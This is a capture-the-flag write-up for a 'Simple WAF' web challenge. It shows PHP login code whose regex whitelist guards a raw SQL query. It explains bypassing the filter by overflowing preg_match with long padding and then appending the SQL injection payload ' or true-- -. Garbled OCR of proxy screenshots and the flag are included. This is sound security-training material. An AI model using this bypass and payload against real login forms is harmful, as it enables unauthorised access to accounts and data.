# Simple WAF
> i whitelisted input values so, i think iam safe : P

## About the Challenge
We got a website and the source code (You can download the source code [here](simple_waf_togive.zip)). The source code is pretty simple:

```php
require_once("db.php");

function waf($input)
{
    if(preg_match("/([^a-z])+/s",$input))
    {
        return true;
    }
    else
    {
        return false;
    }
}


if(isset($_POST['login-submit']))
{
	if(!empty($_POST['username'])&&!empty($_POST['password']))
	{
        $username=$_POST['username'];
		$password=md5($_POST['password']);
        if(waf($username))
        {
            die("WAF Block");
        }
        else
        {
            $res = $conn->query("select * from users where username='$username' and password='$password'");
                                                                    
            if($res->num_rows ===1)
            {
                echo "0xL4ugh{Fake_Flag}";
            }
            else
            {
                echo "<script>alert('Wrong Creds')</script>";
            }
    }

	}
	else
	{
		echo "<script>alert('Please Fill All Fields')</script>";
	}
}
```

This website is vulnerable to SQL injection, but there's a waf() function that we need to bypass in order to perform SQL injection


[Image extracted text: Request
Response
Pretty
Raw
Hex
3)
In
=
Pretty
Raw
Hex
Render
PosT
HTTP/1.1
HTTP/1.1
200
OK
2
Host
20.115.83.90:1339
2
Date:
Sun,
11
Feb
2024
01:39:57
GMT
3 Content-Length:
50
3
Server:
Apache/2.4.56
(Debian)
Cache-Control:
max-age-0
X-Powered-By: 
PHP/8.0.30
5
Upgrade-Insecure-Requests:
5 Content-Length:
6 Origin:
http://20 _
115.83.90
1339
6
Connection:
close
Content-Type
application/X-WWW-form-urlencoded
Content-Type:
text/html;
charset-UTF-8
User-Agent
Mozilla/5.0
(Windows
NT
10.0;
Win64;
X64)
AppleWebKit/537.36
(KHTML ,
like
Gecko)
Chrome/121.0.6167
160
Safari/537.36
WAF
Block
Accept
text/html,application/xhtmltxml,application/xml;q-0.9, image/avif _
image/we
bp, image
apng,*/*;9=0.8,application/signed-exchange;v=b3;q=0.7
10
Referer:
http://20
115.83.90:1339
11 Accept-Encoding
gzip,
deflate,
br
12 Accept-Language:
en-US, en;q-0.9
13
Connection:
close
14
15
username=
ok
true -
~Gpassword-testalogin-submit=]


## How to Solve?
We need to overflow the `preg_match` function by supplying a lot of characters, followed by an SQL injection payload (e.g., `' or true-- -`)


[Image extracted text: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
X-Powered-By
PHP/ 8 . 0
30
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
5
Vary:
Accept-Encoding
Reque
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Content-Length:
3913
AAAAAAAAA
Connection:
close
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Content-Type:
text/html;
charset-UTF-8
Reque
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
10
OxL4ugh{Oohh_You_Brok3_My_Whlte_List! ! !}
Reque
AAAAAAAAA
IAAAAAAAAAAA
11
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
12
<html lang="en">
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
13
<head>
Respo
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
14
<meta
charset="UTF-8">
AAAAAAAAA
IAAAAAAAAAAA
15
<meta
name="viewport
content="width-device-width,
initial-scale-1.0">
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
16
<title>
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Ghazy Corp
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
~</title>
AAAAAAAAA
IAAAAAAAAAAA
17
<link
href="
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
https: //cdn.jsdelivr net/npm/bootstrap@5. 0 _
0-betal/dist/css/bootstrap.min.€
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
SS
rel-"stylesheet"
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
18
<link
href-"https: //use. fontawesome
com/ releases/v5.7.2/css/all.css"
rel="
AAAAAAAAA
IAAAAAAAAAAA
stylesheet
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
19
<script src="
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
https: //cdn.jsdelivr.net/npm/bootstrap@5.0.0-betal/dist/js/bootstrap. bundle
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
min.js">
AAAAAAAAA
IAAAAAAAAAAA
</script>
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
20
<script
src=" //code.jquery
com/ jquery-1.11.1.min.js">
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
<1
script>
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAA
IAAAAAAAAAAA
21
</head>
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
22
~style>
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
23
I* Importing
fonts
from GoogLe
*l
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
24
@importurl(
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
'https: / /fonts.googleapis. com/css2?family-Poppins:wght@300;400;500;600; 700;
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
800;9006display-swap' ) ;
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
25
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
26
Reset
*l
AAAAAAAAAAAAAAAAAAAAAAAAA
true:
Gpassword-test&log
n-submit=
27
Search
highlights
Search
highlights
ing]


```
0xL4ugh{0ohh_You_Brok3_My_Wh1te_List!!!}
```